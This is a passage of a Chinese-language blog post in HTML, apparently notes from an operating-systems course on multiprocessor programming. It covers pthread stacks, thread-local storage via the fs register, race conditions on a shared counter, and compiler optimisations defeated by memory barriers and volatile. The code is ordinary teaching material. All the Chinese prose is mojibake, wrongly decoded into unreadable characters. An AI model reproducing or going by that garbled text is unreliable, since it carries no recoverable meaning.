class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show</span><span class="params">(<span class="type">void</span>* ptr)</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, <span class="string">&quot;grxer&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;grxer&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    pthread_create(&amp;id, <span class="literal">NULL</span>, show,(<span class="type">void</span>*) name);</span><br><span class="line">    pthread_join(id, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -g -o  test test.c -pthread</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">hello  grxerâ    </span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•æ”¹å˜è¿™ä¸ªå †æ ˆå¤§å°"><a href="#å¦‚ä½•æ”¹å˜è¿™ä¸ªå †æ ˆå¤§å°" class="headerlink" title="å¦‚ä½•æ”¹å˜è¿™ä¸ªå †æ ˆå¤§å°?"></a>å¦‚ä½•æ”¹å˜è¿™ä¸ªå †æ ˆå¤§å°?</h3><blockquote><p>å¯ä»¥åˆ©ç”¨pthread_createç¬¬äºŒä¸ªå‚æ•°çº¿ç¨‹å±æ€§åœ¨åˆ›å»ºçº¿ç¨‹æ—¶åšæ“ä½œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Data structure for condition variable handling.  The structure of</span></span><br><span class="line"><span class="comment">   the attribute type is not exposed on purpose.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> __size[__SIZEOF_PTHREAD_CONDATTR_T];</span><br><span class="line">  <span class="type">int</span> __align;</span><br><span class="line">&#125; <span class="type">pthread_condattr_t</span>;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å…¬å¼€ç±»å‹ï¼Œä½†æ˜¯ç»™æˆ‘ä»¬äº†api</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_init</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> *stacksize)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> stacksize)</span>;</span><br><span class="line">è¿”å›å€¼<span class="number">0</span>ï¼Œ<span class="number">-1</span>åˆ†åˆ«è¡¨ç¤ºæˆåŠŸä¸å¤±è´¥ï¼Œè¿™é‡Œçš„stacksizeéƒ½æ˜¯ä»¥byteä¸ºå•ä½</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    <span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line">    <span class="type">size_t</span> stacksize;</span><br><span class="line">    <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before:%zu\n&quot;</span>, stacksize);</span><br><span class="line">    res = pthread_attr_setstacksize(&amp;thread_attr,<span class="number">10485760</span>);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after:%zu\n&quot;</span>, stacksize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">before:<span class="number">8388608</span></span><br><span class="line">after:<span class="number">10485760</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™æ ·å»æ”¹é€ ä¸€ä¸‹<code>thread.h</code>å°±å¥½</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line"> <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line"> assert(!res);</span><br><span class="line"> res = pthread_attr_setstacksize(&amp;thread_attr, <span class="number">10485760</span>);</span><br><span class="line"> assert(!res);</span><br><span class="line"> pthread_create(&amp;(tptr-&gt;thread), &amp;thread_attr, wrapper, tptr);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404203402253.png" alt="image-20230404203402253"></p></blockquote><h3 id="threadæµ…è°ˆ"><a href="#threadæµ…è°ˆ" class="headerlink" title="__threadæµ…è°ˆ"></a>__threadæµ…è°ˆ</h3><p><strong>Thread Local Storage</strong>ï¼Œä¹‹å‰åŠ«æŒè¿‡tlsæ¥bypass canaryï¼Œä½†æ˜¯å¯¹åº•å±‚ç†è§£å¹¶ä¸æ·±ï¼Œè¿™æ¬¡æœ‰äº†æ–°çš„ä½“ä¼šï¼Œä½†æ˜¯ä¹Ÿåªæ˜¯æµ…è°ˆï¼Œå¥½å¤šä¸œè¥¿è¿˜æ²¡ææ‡‚ï¼Œè¦å»è¡¥è¡¥ä¿æŠ¤æ¨¡å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_cur</span><br><span class="line">.text:0000000000001388 55                            push    rbp</span><br><span class="line">.text:0000000000001389 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000000138C 64 48 8B 04 25 F0 FF FF FF    mov     rax, fs:0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000001395 5D                            pop     rbp</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å’Œfsæ®µå¯„å­˜å™¨æœ‰å…³ï¼Œå…¶å®å‡†ç¡®æ¥è¯´ï¼Œè‡ªä»8086çš„å®æ¨¡å¼è¿‡åï¼Œcs ss ds esç­‰æ®µå¯„å­˜å™¨é‡Œé¢å­˜çš„ä¸å†æ˜¯ä¸ºäº†æ»¡è¶³20ä½åœ°å€æ€»çº¿å’Œé‡å®šä½çš„ç‰©ç†æ®µåŸºåœ°å€ï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å˜ä¸ºäº†æ®µé€‰æ‹©å­—ï¼Œç°åœ¨æ›´åº”è¯¥å«æ®µé€‰æ‹©å™¨ï¼Œä¿æŠ¤æ¨¡å¼ä¸‹ä¼šæœ‰ç”¨æˆ·æ€ä¸å¯è§çš„éƒ¨åˆ†ï¼Œå«åšæè¿°ç¬¦é«˜é€Ÿç¼“å†²å™¨(æ˜¯ä¸€ä¸ªç¼“å­˜ï¼Œæ¯æ¬¡è¿›è¡Œæ®µè§£æåä¿å­˜å†é‡Œé¢)ï¼Œç”±å¤„ç†å™¨è‡ªåŠ¨ä½¿ç”¨ï¼Œè€ŒçœŸæ­£çš„æ®µåœ°å€å°±åœ¨è¿™é‡Œé¢</p><p><strong>æœ‰ä»¥ä¸‹æ–¹å¼å»è·å¾—fsæ®µåœ°å€</strong></p><p>&gt;&gt;&gt;é€šè¿‡å†…è”æ±‡ç¼–çš„æ–¹å¼</p><p>&gt;&gt;&gt;<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/arch_prctl.2.html">ç³»ç»Ÿè°ƒç”¨int arch_prctl(int code, unsigned long *addr)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value2;</span><br><span class="line">    <span class="type">pthread_t</span> pid = pthread_self();</span><br><span class="line">    <span class="type">int</span> ret = arch_prctl(ARCH_GET_FS,&amp;fs_value2); </span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (fs_value))</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FSå¯„å­˜å™¨çš„å€¼ä¸º: 0x%lx\narch_prctl:0x%lx\npid:0x%lx&quot;</span>, fs_value,fs_value2,pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/ctest&gt; ./test</span><br><span class="line">FSå¯„å­˜å™¨çš„å€¼ä¸º: <span class="number">0x7ffff7fa6740</span></span><br><span class="line">arch_prctl:<span class="number">0x7ffff7fa6740</span></span><br><span class="line">pid:<span class="number">0x7ffff7fa6740</span>â   </span><br></pre></td></tr></table></figure><p>&gt;&gt;&gt;gdbçš„<code>fsbaseå‘½ä»¤</code>æˆ–<code>p/x pthread_self()</code>è·å¾—è¿™ä¸ªå€¼</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404205339561.png" alt="image-20230404205339561"></p><p>è¿™é‡Œæ‰æƒŠå¥‡çš„å‘ç°gdbé‡Œå¯ä»¥ç›´æ¥è¿è¡Œcå‡½æ•°</p><p>å¯ä»¥çœ‹åˆ°POSIXçº¿ç¨‹åº“çš„pthread_createè¿”å›ç»™æˆ‘ä»¬çš„tidpæ˜¯æ¯ä¸ªçº¿ç¨‹çš„fsæ®µåœ°å€</p><p>è§‚å¯Ÿä¸€ä¸‹ç¨‹åºé‡Œå®šä¹‰çš„__threadå˜é‡å’Œæ±‡ç¼–é‡Œçš„å…³ç³»</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">base:.text:<span class="number">0000000000001435</span> <span class="number">64</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> F8 FF FF FF       mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFF8h(<span class="number">-8</span>), eax</span><br><span class="line">curï¼š.text:<span class="number">000000000000138</span>C <span class="number">64</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> F0 FF FF FF    mov     rax, fs:<span class="number">0F</span>FFFFFFFFFFFFFF0h(<span class="number">-16</span>)</span><br><span class="line">idï¼š.text:<span class="number">0000000000001441</span> <span class="number">64</span> <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> E8 FF FF FF    mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFE8h(<span class="number">-24</span>), rax</span><br></pre></td></tr></table></figure><p>åœ¨fs-8å¤„å¼€å§‹æ’åˆ—ï¼Œä»–çš„ä¸‹é¢ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ä¹‹å‰çœ‹çš„canaryå’Œ__exit_funcsææ„å‡½æ•°ç»„çš„keyï¼Œpthread_createå»åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ˜¯ç”¨mmapä¸€å—å†…å­˜å½“ä½œå †æ ˆï¼Œfsåˆ™ä½äºè¿™ä¸ªå †æ ˆçš„é«˜åœ°å€å¤„ï¼Œä¹Ÿå°±æ˜¯å †æ ˆçš„åº•éƒ¨</p><h2 id="åŸå­æ€§çš„ä¸§å¤±"><a href="#åŸå­æ€§çš„ä¸§å¤±" class="headerlink" title="åŸå­æ€§çš„ä¸§å¤±"></a>åŸå­æ€§çš„ä¸§å¤±</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsum</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    sum++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±è¿å•å¤„ç†å™¨å¹¶å‘éƒ½å¾—ä¸åˆ°æ­£ç¡®çš„ç»“æœã€‚<code>taskset -c cpu-cpu &lt;command&gt;</code>é™åˆ¶åœ¨cpu-cpuä¸ªå¤„ç†å™¨ä¸Šè¿è¡Œ</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235118554.png" alt="image-20230404235118554"></p><p>å¤šå¤„ç†å™¨çº¿ç¨‹åœ¨å¹¶è¡Œï¼Œåå·®æ›´å¤§</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235238898.png" alt="image-20230404235238898"></p><p>å…·ä½“æ¥è¯´ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨è¯»å–sumçš„å€¼æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½å·²ç»ä¿®æ”¹äº†sumçš„å€¼ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªçº¿ç¨‹å¹¶ä¸çŸ¥é“ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸€ä¸ªçº¿ç¨‹è¦†ç›–äº†å¦ä¸€ä¸ªçº¿ç¨‹çš„ç»“æœï¼Œä»è€Œå¯¼è‡´æœ€ç»ˆç»“æœé”™è¯¯ã€‚</p><p>sum++ç¿»è¯‘ä¸ºæ±‡ç¼–æ˜¯ä¸‰æ¡æŒ‡ä»¤ï¼Œå–å‡ºï¼Œ+1ï¼Œå†™å›ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å•å¤„ç†å™¨ä¸ºä»€ä¹ˆä¼šå‡ºé”™åŸå› </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 48 8B 05 DF 31 00 00          mov     rax, cs:sum</span><br><span class="line">.text:0000000000001461 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001465 48 89 05 D4 31 00 00          mov     cs:sum, rax</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨å†…è”æ±‡ç¼–æŠŠsum++æ”¹ä¸ºä¸€å¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;add $1,%0&quot;</span>:<span class="string">&quot;+m&quot;</span>(sum))</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 83 05 DF 31 00 00 01          add     dword ptr cs:sum, 1</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å•æ ¸å¤„ç†å™¨æ²¡æœ‰å¤šå¤„ç†å™¨ä¹±åºçš„å¹¶è¡Œï¼Œå¯ä»¥æ­£å¸¸å¾—åˆ°ç»“æœ</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000115259.png" alt="image-20230405000115259"></p><p>å¤šæ ¸å¤„ç†å™¨ä¾æ—§å‡ºå·®ï¼Œä¸è¿‡è¯¯å·®ä½äº†ä¸€ç‚¹</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000145046.png" alt="image-20230405000145046"></p><h2 id="é¡ºåºçš„ä¸§å¤±"><a href="#é¡ºåºçš„ä¸§å¤±" class="headerlink" title="é¡ºåºçš„ä¸§å¤±"></a>é¡ºåºçš„ä¸§å¤±</h2><ul><li>ç”¨gccå¯¹ç¨‹åºè¿›è¡Œ-O1çš„ä¼˜åŒ–å‘ç°æ¯æ¬¡è¿è¡Œç»“æœéƒ½æ˜¯sum &#x3D; 100000000</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001223</span><br><span class="line">.text:0000000000001223                               ; void __cdecl Tsum()</span><br><span class="line">.text:0000000000001223                               public Tsum</span><br><span class="line">.text:0000000000001223                               Tsum proc near                          ; DATA XREF: main+5â†“o</span><br><span class="line">.text:0000000000001223                               ; __unwind &#123;</span><br><span class="line">.text:0000000000001223 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001227 48 8B 15 12 2E 00 00          mov     rdx, cs:sum</span><br><span class="line">.text:000000000000122E 48 8D 42 01                   lea     rax, [rdx+1]</span><br><span class="line">.text:0000000000001232 48 81 C2 01 E1 F5 05          add     rdx, 5F5E101h</span><br><span class="line">.text:0000000000001232</span><br><span class="line">.text:0000000000001239</span><br><span class="line">.text:0000000000001239                               loc_1239:                               ; CODE XREF: Tsum+20â†“j</span><br><span class="line">.text:0000000000001239 48 89 C1                      mov     rcx, rax</span><br><span class="line">.text:000000000000123C 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001240 48 39 D0                      cmp     rax, rdx</span><br><span class="line">.text:0000000000001243 75 F4                         jnz     short loc_1239</span><br><span class="line">.text:0000000000001243</span><br><span class="line">.text:0000000000001245 48 89 0D F4 2D 00 00          mov     cs:sum, rcx</span><br><span class="line">.text:000000000000124C C3                            retn</span><br></pre></td></tr></table></figure><p>-01çš„ä¼˜åŒ–ä¿ç•™äº†å¾ªç¯ï¼Œä½†æ˜¯ä¼˜åŒ–äº†æ¯æ¬¡å†™å›å†…å­˜çš„æ“ä½œï¼Œç”¨rcxå¯„å­˜å™¨ä»£æ›¿</p><p><code>mov     cs:sum, rcx</code>æœ€åå†™å›çš„è¿™ä¸€æ­¥å†³å®šäº†<code>sum = 100000000</code></p><ul><li>-O2ä¼˜åŒ– æ¯æ¬¡è¿è¡Œç»“æœsum &#x3D; 200000000</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001290</span>                               ; <span class="type">void</span> __cdecl <span class="title function_">Tsum</span><span class="params">()</span></span><br><span class="line">.text:0000000000001290                               public Tsum</span><br><span class="line">.text:0000000000001290                               Tsum proc near                          ; DATA XREF: main+<span class="number">5</span>â†‘o</span><br><span class="line">.text:<span class="number">0000000000001290</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001290</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">48</span> <span class="number">81</span> <span class="number">05</span> A1 <span class="number">2</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E1 F5+add     cs:sum, <span class="number">5F</span>5E100h</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">05</span></span><br><span class="line">.text:<span class="number">000000000000129F</span> C3                            retn</span><br></pre></td></tr></table></figure><p>å¾ªç¯ä¹Ÿæ²¡æœ‰äº†ï¼Œç›´æ¥æŠŠæ­£ç¡®ç»“æœä¸€ä¸ªaddï¼Œå¾—åˆ°æ­£ç¡®ç»“æœï¼Œä½†æ˜¯è¿™åªæ˜¯ä¸€ä¸ªå‡è±¡ï¼Œå’Œå‰é¢ä¸€å¥addæ±‡ç¼–ä¸€æ ·ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨è¯»å–sumçš„å€¼æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½å·²ç»ä¿®æ”¹äº†sumçš„å€¼ï¼Œæˆ‘ä»¬åªæ˜¯ä¸¤ä¸ªçº¿ç¨‹å»addï¼Œåªæ˜¯é”™è¯¯å¾—å‡ ç‡å¾ˆå°ï¼Œæˆ‘ä»¬æŠŠçº¿ç¨‹å¢åŠ åˆ°14ï¼Œ14æ¬¡ç«äº‰addå°±å·²ç»æœ‰å¯è§æ¦‚ç‡é”™è¯¯äº†</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405004225147.png" alt="image-20230405004225147"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> done;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!done) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸€æ®µä»£ç æˆ‘ä»¬åªç¼–è¯‘ä¸é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    55                   push   %rbp</span><br><span class="line">   5:    48 89 e5             mov    %rsp,%rbp</span><br><span class="line">   8:    90                   nop</span><br><span class="line">   9:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # f &lt;join+0xf&gt;</span><br><span class="line">   f:    85 c0                test   %eax,%eax</span><br><span class="line">  11:    74 f6                je     9 &lt;join+0x9&gt;</span><br><span class="line">  13:    90                   nop</span><br><span class="line">  14:    90                   nop</span><br><span class="line">  15:    5d                   pop    %rbp</span><br><span class="line">  16:    c3                   ret    </span><br></pre></td></tr></table></figure><p>æ²¡åŠ ä¼˜åŒ–ï¼Œæ¯ä¸€æ¬¡éƒ½ä¼šæŠŠdoneå–å‡ºæ¥ï¼Œåˆ¤æ–­doneæ˜¯å¦ä¸º0</p><p>-O1ä¼˜åŒ–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O1 -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;join&gt;:</span><br><span class="line">   <span class="number">0</span>:    f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">   <span class="number">4</span>:    <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%rip),%eax        <span class="meta"># a <span class="string">&lt;join+0xa&gt;</span></span></span><br><span class="line">   a:    <span class="number">85</span> c0                test   %eax,%eax</span><br><span class="line">   c:    <span class="number">74</span> fc                je     a &lt;join+<span class="number">0xa</span>&gt;</span><br><span class="line">   e:    c3                   ret    </span><br></pre></td></tr></table></figure><p>åªè¿›è¡Œäº†ä¸€æ¬¡å–å‡ºdoneï¼Œå¤šæ¬¡åˆ¤æ–­ç›¸å½“äº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(x=done))&#123;</span><br><span class="line">    <span class="keyword">while</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“è¿™ä¸ªdoneä¸ºå…¨å±€å˜é‡ï¼Œä¸‡ä¸€è¢«æŸä¸ªçº¿ç¨‹æ”¹æ‰äº†å‘¢ï¼Ÿå°±å›å˜äº†åŸæœ¬çš„é€»è¾‘</p><p>-O2ä¼˜åŒ–</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # a &lt;join+0xa&gt;</span><br><span class="line">   a:    85 c0                test   %eax,%eax</span><br><span class="line">   c:    75 02                jne    10 &lt;join+0x10&gt;</span><br><span class="line">   e:    eb fe                jmp    e &lt;join+0xe&gt;</span><br><span class="line">  10:    c3                   ret   </span><br></pre></td></tr></table></figure><p>æ›´ç¦»è°±äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!done)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£å†³åŠæ³•</strong></p><p>ç»™ç¼–è¯‘å™¨åŠ ä¸€ä¸‹é™åˆ¶</p><ul><li><p>Memory Barrier</p><blockquote><p>asm volatile (â€œâ€ ::: â€œmemoryâ€)</p><p>volatileå‘Šè¯‰ç¼–è¯‘å™¨ä¸è¦å¯¹è¿™æ¡æŒ‡ä»¤ä¼˜åŒ–</p><p>memory è¡¨ç¤ºæŒ‡ä»¤ä»¥ä¸å¯é¢„æµ‹çš„æ–¹å¼ä¿®æ”¹äº†å†…å­˜ï¼Œ å¼ºåˆ¶gccç¼–è¯‘å™¨å‡è®¾RAMæ‰€æœ‰å†…å­˜å•å…ƒå‡è¢«æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹ï¼Œè¿™æ ·cpuä¸­çš„registerså’Œcacheä¸­å·²ç¼“å­˜çš„å†…å­˜å•å…ƒä¸­çš„æ•°æ®å°†ä½œåºŸã€‚cpuå°†ä¸å¾—ä¸åœ¨éœ€è¦çš„æ—¶å€™é‡æ–°è¯»å–å†…å­˜ä¸­çš„æ•°æ®ã€‚</p></blockquote></li><li><p>ä½¿ç”¨volatileå˜é‡</p><blockquote><p><strong>extern</strong> int <strong>volatile</strong> done;</p><p>volatile æŒ‡å‡º done æ˜¯éšæ—¶å¯èƒ½å‘ç”Ÿå˜åŒ–çš„ï¼Œæ¯æ¬¡ä½¿ç”¨å®ƒçš„æ—¶å€™å¿…é¡»ä»doneçš„å†…å­˜åœ°å€ä¸­è¯»å–ï¼Œå³ä½¿cacheæˆ–å¯„å­˜å™¨é‡Œæœ‰</p></blockquote></li></ul><h2 id="å¯è§æ€§çš„ä¸§å¤±"><a href="#å¯è§æ€§çš„ä¸§å¤±" class="headerlink" title="å¯è§æ€§çš„ä¸§å¤±"></a>å¯è§æ€§çš„ä¸§å¤±</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT_FOR(cond) while 